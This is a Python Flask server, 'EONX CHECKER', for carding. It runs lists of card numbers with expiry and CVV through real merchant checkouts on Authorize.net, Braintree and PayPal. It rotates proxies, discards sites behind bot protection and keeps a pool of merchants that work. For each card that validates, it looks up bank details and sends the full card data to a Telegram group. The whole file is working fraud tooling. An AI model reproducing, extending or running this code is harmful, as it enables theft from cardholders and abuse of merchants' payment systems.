#!/usr/bin/env python3
"""
EONX CHECKER  —  port 5052
Web UI + SSE streaming.  Gunicorn: 6 workers, gthread class.
"""

import json
import logging
import os
import queue as q_mod
import threading
import time
import uuid

import requests
import urllib3
urllib3.disable_warnings()

from flask import Flask, Response, jsonify, render_template, request

from gateways.authnetcim import check_authnet
from gateways.b3magento  import check_b3magento
from gateways.b3woo      import check_b3woo
from gateways.ppcp       import check_ppcp
from gateways.pymntpl    import check_pymntpl
from gateways.utils      import (
    build_session,
    build_session_for_domain,
    build_session_from_str,
    fetch_bin_dict,
    fetch_bin_info,
    iso_to_flag,
    parse_domain,
    session_id,
)

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
logger = logging.getLogger("eonx_checker")

# ── Telegram config (loaded from environment) ─────────────────────────────────
BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "")
_TOPIC_ID_RAW = os.environ.get("TELEGRAM_TOPIC_ID", "0")
try:
    TOPIC_ID = int(_TOPIC_ID_RAW)
except ValueError:
    logger.warning(
        "TELEGRAM_TOPIC_ID='%s' is not a valid integer; defaulting to 0", _TOPIC_ID_RAW
    )
    TOPIC_ID = 0


def send_telegram(message: str) -> None:
    """Send message to Telegram group topic.  No-op when BOT_TOKEN is unset."""
    if not BOT_TOKEN:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id":                  CHAT_ID,
                "message_thread_id":        TOPIC_ID,
                "text":                     message,
                "parse_mode":               "HTML",
                "disable_web_page_preview": True,
            },
            timeout=10,
        )
    except Exception:
        logger.warning("Telegram notification failed", exc_info=True)


# ─────────────────────────────────────────────────────────────

app = Flask(__name__)

# ── Config ────────────────────────────────────────────────────────────────────
DEFAULT_THREADS    = 5
MAX_THREADS        = 10
JOB_TTL            = 3600   # seconds before completed jobs are reaped
MAX_CONCURRENT_JOBS = 30   # 30 users max — 30 × 10 threads = 300 concurrent requests
# Maximum number of result messages buffered per job.  Prevents unbounded memory
# growth when a client disconnects before consuming all results.
MAX_JOB_QUEUE_SIZE = 10000

# ── In-memory job store ───────────────────────────────────────────────────────
JOBS: dict[str, dict] = {}
_JOB_LOCK = threading.Lock()

# ── Per-session-token lock (one active scan per browser session) ──────────────
# Using a token sent by the client instead of IP so users behind the same
# NAT / proxy can each run their own scan independently.
_ACTIVE_TOKENS: set = set()
_TOKEN_LOCK = threading.Lock()

# ── Working-sites store (per gateway) ────────────────────────────────────────────────
# Domains that produced a definitive result (live or dead, NOT unknown) are
# saved per gateway and used as the default list when the domain field is empty.
WORKING_SITES_FILES = {
    "authnet":   "data/authnet.txt",
    "ppcp":      "data/ppcp.txt",
    "pymntpl":   "data/pymntpl.txt",
    "b3magento": "data/b3magento.txt",
    "b3woo":     "data/b3woo.txt",
}
_WORKING_SITES: dict[str, set] = {"authnet": set(), "ppcp": set(), "pymntpl": set(), "b3magento": set(), "b3woo": set()}
_SITES_LOCK = threading.Lock()


def _load_working_sites() -> None:
    """Load persisted working sites from disk into memory on startup."""
    for gateway, path in WORKING_SITES_FILES.items():
        try:
            if os.path.exists(path):
                with open(path, "r", encoding="utf-8") as f:
                    for line in f:
                        d = line.strip()
                        if d:
                            _WORKING_SITES[gateway].add(d)
        except Exception:
            logger.warning("Failed to load working sites for gateway %s", gateway, exc_info=True)

_load_working_sites()


def _save_working_site(domain: str, gateway: str) -> None:
    """Add domain to the gateway-specific working set and persist to disk.
    Called for both live and dead (decline) results — not for unknown.
    """
    gw  = gateway if gateway in _WORKING_SITES else "authnet"
    with _SITES_LOCK:
        if domain in _WORKING_SITES[gw]:
            return
        _WORKING_SITES[gw].add(domain)
    try:
        with open(WORKING_SITES_FILES[gw], "a", encoding="utf-8") as f:
            f.write(domain + "\n")
    except Exception:
        logger.warning("Failed to persist new site %s for gateway %s", domain, gw, exc_info=True)


def _remove_working_site(domain: str, gateway: str) -> None:
    """Remove a bad domain from the gateway's working set and rewrite the file.
    Called when a domain triggers a structural site error (not just a proxy error).
    The file write is kept inside the lock to prevent concurrent write races.
    """
    gw = gateway if gateway in _WORKING_SITES else "authnet"
    with _SITES_LOCK:
        _WORKING_SITES[gw].discard(domain)
        sites = list(_WORKING_SITES[gw])
        try:
            with open(WORKING_SITES_FILES[gw], "w", encoding="utf-8") as f:
                f.write("\n".join(sites) + ("\n" if sites else ""))
        except Exception:
            logger.warning("Failed to persist removed site %s for gateway %s", domain, gw, exc_info=True)

# ── Job reaper ────────────────────────────────────────────────────────────────
def _reaper() -> None:
    while True:
        time.sleep(300)
        cutoff = time.time() - JOB_TTL
        stale  = [
            jid for jid, job in list(JOBS.items())
            if job.get("created_at", 0) < cutoff
            and job.get("status") in ("done", "queued")
        ]
        for jid in stale:
            with _JOB_LOCK:
                JOBS.pop(jid, None)

threading.Thread(target=_reaper, daemon=True).start()


# ── Telegram sender (wraps utils.send_telegram) ──────────────────────────────
def _tg_live(text: str) -> None:
    """Send live card hit to the configured Telegram group via utils.send_telegram."""
    threading.Thread(target=send_telegram, args=(text,), daemon=True).start()


# ── Bad-site classifier ───────────────────────────────────────────────────────
# Only structural site errors should permanently remove a domain from the pool.
# Proxy/network failures and transient WordPress errors keep the domain alive.

_BAD_SITE_PATTERNS = [
    "could not find product",      # no product on store
    "add to cart failed",           # store has no cart / incompatible
    "not a pymntpl-paypal store",   # wrong gateway
    "not a braintree store",        # Magento store without Braintree
    "not a woocommerce braintree store",  # WooCommerce store without Braintree
    "bot/firewall",                 # cloudflare / ddos-guard / captcha
    "non-json response",            # not a WooCommerce store
    "cart empty",                   # persistent empty-cart (ATC broken at site level)
    "braintree sandbox",            # site uses Braintree test/sandbox account
]

_KEEP_DOMAIN_PATTERNS = [
    "proxy",                     # ProxyError, proxy refused, etc.
    "connection",                # ConnectionError, ConnectionReset
    "timeout",                   # read/connect timeout
    "ssl",                       # SSL handshake errors
    "remote",                    # RemoteDisconnected
    "network",                   # generic network
    "max retries",               # urllib3 retry loop exhausted
    "critical error on this website",  # transient WordPress fatal
    "atc error:",                # ATC threw exception (likely proxy)
    "checkout load:",            # network error loading checkout page
    "checkout fetch:",           # same
    "checkout post:",            # network error on checkout POST
    "checkout submit:",          # same
    "create order error:",       # PayPal order creation network error
    "config parse error:",       # transient parse issue
    "order creation failed",     # transient
    "empty response",            # proxy returned nothing
    "rate limit",                # 429 — transient
    "http 429",
    "http 503",
    "http 403",
]


def _is_bad_site_error(message: str) -> bool:
    """Return True only for permanent structural site failures.
    Proxy/network/transient errors return False (domain is kept).
    """
    msg = message.lower()
    # Proxy/network/transient → always keep domain
    for pat in _KEEP_DOMAIN_PATTERNS:
        if pat in msg:
            return False
    # Structural site error → mark bad
    for pat in _BAD_SITE_PATTERNS:
        if pat in msg:
            return True
    return False


# ── Worker ────────────────────────────────────────────────────────────────────
def _scan_worker(
    job_id:       str,
    cards:        list[tuple],
    domains:      list[str],
    num_threads:  int,
    client_token: str,
    gateway:      str = "authnet",
    user_proxy:   str = "",
) -> None:
    try:
        job = JOBS[job_id]
        job["status"] = "running"

        semaphore = threading.Semaphore(num_threads)
        idid      = session_id()

        # ── Round-robin domain rotator + bad-domain tracking ─────────────────
        _rr_index    = 0
        _rr_lock     = threading.Lock()
        _bad_domains: set = set()

        def _next_good_domain() -> str:
            nonlocal _rr_index
            with _rr_lock:
                good = [d for d in domains if d not in _bad_domains]
                pool = good if good else domains
                d = pool[_rr_index % len(pool)]
                _rr_index += 1
            return d

        def check_one(card_tuple: tuple, domain: str) -> None:
            # Bail immediately if the job was stopped before this thread ran
            if job.get("stop"):
                semaphore.release()
                return

            new_bad_domain = ""
            result = None
            for attempt in range(2):
                if job.get("stop"):
                    break
                if user_proxy:
                    sess = build_session_from_str(user_proxy)
                else:
                    sess = build_session_for_domain(domain)
                try:
                    if gateway == "ppcp":
                        result = check_ppcp(sess, domain, card_tuple)
                    elif gateway == "pymntpl":
                        result = check_pymntpl(sess, domain, card_tuple)
                    elif gateway == "b3magento":
                        result = check_b3magento(sess, domain, card_tuple)
                    elif gateway == "b3woo":
                        result = check_b3woo(sess, domain, card_tuple)
                    else:
                        result = check_authnet(
                            sess, domain, "",   # "" → auto-discover product_id
                            card_tuple, idid=idid,
                        )
                except Exception as e:
                    cc, mm, yy, cvv = card_tuple
                    result = {
                        "status":  "unknown",
                        "message": str(e)[:120],
                        "amount":  "",
                        "card":    f"{cc}|{mm}|{yy}" + (f"|{cvv}" if cvv else ""),
                    }
                finally:
                    sess.close()

                result["domain"] = domain

                # First-attempt structural error → mark domain bad, retry on a good domain
                if result["status"] == "unknown" and attempt == 0 and _is_bad_site_error(result["message"]):
                    with _rr_lock:
                        _bad_domains.add(domain)
                    new_bad_domain = domain
                    job["bad_count"] = len(_bad_domains)
                    # Purge from persistent saved sites so it won't load next time
                    _remove_working_site(domain, gateway)
                    good = [d for d in domains if d not in _bad_domains]
                    if good:
                        domain = good[0]
                        continue  # retry on good domain
                break  # success / already retried / no good domains left

            if result is None:
                semaphore.release()
                return

            # Fetch BIN info for live hits only
            bin_info = ""
            bin_dict: dict = {}
            if result["status"] == "live":
                try:
                    bin6     = result["card"].split("|")[0][:6]
                    bin_dict = fetch_bin_dict(bin6)
                    bin_info = fetch_bin_info(bin6)
                except Exception:
                    pass
            result["bin_info"] = bin_info

            # Save site if it gave a definitive result (live or dead)
            if result["status"] in ("live", "dead"):
                _save_working_site(domain, gateway)

            with _JOB_LOCK:
                job["done"] += 1
                if result["status"] == "live":
                    job["live"] += 1
                elif result["status"] == "dead":
                    job["dead"] += 1
                else:
                    job["unknown"] += 1

            job["queue"].put(json.dumps({
                "type":           "result",
                "card":           result["card"],
                "status":         result["status"],
                "message":        result["message"],
                "amount":         result.get("amount", ""),
                "domain":         result["domain"],
                "bin_info":       result.get("bin_info", ""),
                "new_bad_domain": new_bad_domain,
                "bad_count":      job.get("bad_count", 0),
                "done":           job["done"],
                "total":          job["total"],
                "live":           job["live"],
                "dead":           job["dead"],
                "unknown":        job["unknown"],
            }))

            # Telegram notification for live hits
            if result["status"] == "live":
                amt        = result.get("amount", "")
                amt_str    = f" ({amt})" if amt else ""
                tg_msg     = (
                    f'✅ <b>{result["message"]}{amt_str} — {gateway.upper()}</b>\n'
                    f'🌐 <code>{domain}</code>\n\n'
                    f'<code>{result["card"]}</code>\n'
                    f'━━━━━━━━━━━━━━\n'
                )
                if bin_dict:
                    bank         = bin_dict.get("bank", "")
                    brand        = bin_dict.get("brand", "")
                    card_type    = bin_dict.get("type", "")
                    category     = bin_dict.get("category", "")
                    country_name = bin_dict.get("country_name", "")
                    iso2         = bin_dict.get("iso_code_2", "")
                    flag         = iso_to_flag(iso2) if iso2 else ""
                    type_str     = f"{category} | {brand} ({card_type})" if category else f"{brand} ({card_type})"
                    if bank:
                        tg_msg += f'● {bank}\n'
                    if brand:
                        tg_msg += f'● {type_str}\n'
                    if country_name:
                        tg_msg += f'● {country_name} {flag}'
                _tg_live(tg_msg)

            semaphore.release()

        threads = []
        for card_tuple in cards:
            if job.get("stop"):
                break
            domain = _next_good_domain()
            semaphore.acquire()
            if job.get("stop"):
                semaphore.release()
                break
            t = threading.Thread(
                target=check_one,
                args=(card_tuple, domain),
                daemon=True,
            )
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        job["status"] = "done"
        logger.info("Job %s finished: live=%d dead=%d unknown=%d",
                    job_id, job["live"], job["dead"], job["unknown"])
        job["queue"].put(json.dumps({
            "type":    "done",
            "total":   job["total"],
            "live":    job["live"],
            "dead":    job["dead"],
            "unknown": job["unknown"],
        }))

    finally:
        with _TOKEN_LOCK:
            _ACTIVE_TOKENS.discard(client_token)


# ── Routes ────────────────────────────────────────────────────────────────────

@app.route("/health")
def health():
    """Liveness probe — returns 200 with basic runtime stats."""
    active = sum(1 for j in JOBS.values() if j.get("status") == "running")
    return jsonify({"status": "ok", "active_jobs": active})


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/scan", methods=["POST"])
def scan():
    data        = request.get_json(force=True, silent=True) or {}
    raw_cards   = data.get("cards",   "")
    raw_domains = data.get("domains", "")

    try:
        num_threads = max(1, min(int(data.get("threads", DEFAULT_THREADS)), MAX_THREADS))
    except (TypeError, ValueError):
        num_threads = DEFAULT_THREADS

    user_proxy = str(data.get("proxy",   "") or "").strip()
    gateway    = str(data.get("gateway", "authnet") or "authnet").strip().lower()
    if gateway not in ("authnet", "ppcp", "pymntpl", "b3magento", "b3woo"):
        gateway = "authnet"

    # Parse cards: cc|mm|yy[|cvv]
    def parse_card(line: str):
        p = [x.strip() for x in line.strip().split("|")]
        if len(p) < 3 or not p[0]:
            return None
        return (p[0], p[1], p[2], p[3] if len(p) >= 4 else "")

    lines_c = raw_cards if isinstance(raw_cards, list) else str(raw_cards).splitlines()
    cards   = [c for c in (parse_card(l) for l in lines_c) if c]

    lines_d = raw_domains if isinstance(raw_domains, list) else str(raw_domains).splitlines()
    domains: list[str] = []
    for _line in lines_d:
        _line = _line.strip()
        if not _line:
            continue
        _d = _line.split("|")[0].strip()   # ignore legacy product_id suffix
        _d = parse_domain(_d)
        if _d:
            domains.append(_d)

    if not cards:
        return jsonify({"error": "No valid cards. Format: cc|mm|yy|cvv"}), 400
    MAX_CARDS = 500
    if len(cards) > MAX_CARDS:
        return jsonify({"error": f"Too many cards. Maximum is {MAX_CARDS} per scan."}), 400
    if not domains:
        # Fall back to saved working sites for the selected gateway
        with _SITES_LOCK:
            domains = list(_WORKING_SITES.get(gateway, set()))
        if not domains:
            return jsonify({"error": f"No domains provided and no saved {gateway.upper()} sites yet. Paste at least one domain."}), 400

    # Per-session rate limit — one active scan per browser session token
    client_token = str(data.get("client_token", "") or "").strip()[:64]
    if not client_token:
        # Fallback to direct remote address only — do NOT trust X-Forwarded-For
        # as it can be spoofed by clients to bypass per-session rate limiting.
        client_token = (request.remote_addr or "unknown").strip()

    with _TOKEN_LOCK:
        # Per-session: one scan at a time per user
        if client_token in _ACTIVE_TOKENS:
            return jsonify({"error": "A scan is already running. Wait for it to finish."}), 429
        # Global cap: prevent server exhaustion
        active_count = sum(1 for j in JOBS.values() if j.get("status") == "running")
        if active_count >= MAX_CONCURRENT_JOBS:
            return jsonify({"error": f"Server is at capacity ({MAX_CONCURRENT_JOBS} concurrent scans). Try again shortly."}), 503
        _ACTIVE_TOKENS.add(client_token)

    job_id = uuid.uuid4().hex[:12]
    JOBS[job_id] = {
        "status":     "queued",
        "total":      len(cards),
        "done":       0,
        "live":       0,
        "dead":       0,
        "unknown":    0,
        "bad_count":  0,
        "queue":      q_mod.Queue(maxsize=MAX_JOB_QUEUE_SIZE),
        "created_at": time.time(),
    }

    logger.info("Job %s started: gateway=%s cards=%d domains=%d threads=%d",
                job_id, gateway, len(cards), len(domains), num_threads)

    threading.Thread(
        target=_scan_worker,
        args=(job_id, cards, domains, num_threads, client_token, gateway, user_proxy),
        daemon=True,
    ).start()

    return jsonify({"job_id": job_id, "total": len(cards)})


@app.route("/stop/<job_id>", methods=["POST"])
def stop_job(job_id: str):
    job = JOBS.get(job_id)
    if not job:
        return jsonify({"error": "Job not found"}), 404
    job["stop"] = True
    return jsonify({"ok": True})


@app.route("/sites/<gateway>")
def get_sites(gateway: str):
    """Return saved working sites for a gateway as a JSON list."""
    if gateway not in _WORKING_SITES:
        return jsonify([])
    with _SITES_LOCK:
        sites = sorted(_WORKING_SITES.get(gateway, set()))
    return jsonify(sites)


@app.route("/stream/<job_id>")
def stream(job_id: str):
    job = JOBS.get(job_id)
    if job is None:
        return jsonify({"error": "Job not found"}), 404

    def generate():
        try:
            while True:
                if job.get("stop") and job["status"] != "done":
                    job["status"] = "done"
                    job["queue"].put(json.dumps({
                        "type": "done", "total": job["total"],
                        "live": job["live"], "dead": job["dead"], "unknown": job["unknown"],
                    }))
                try:
                    msg = job["queue"].get(timeout=30)
                    yield f"data: {msg}\n\n"
                    if json.loads(msg).get("type") == "done":
                        break
                except q_mod.Empty:
                    yield 'data: {"type":"ping"}\n\n'
        except GeneratorExit:
            # Client disconnected (page reload / close) — stop the job
            job["stop"] = True

    return Response(
        generate(),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5052, debug=False, threaded=True)
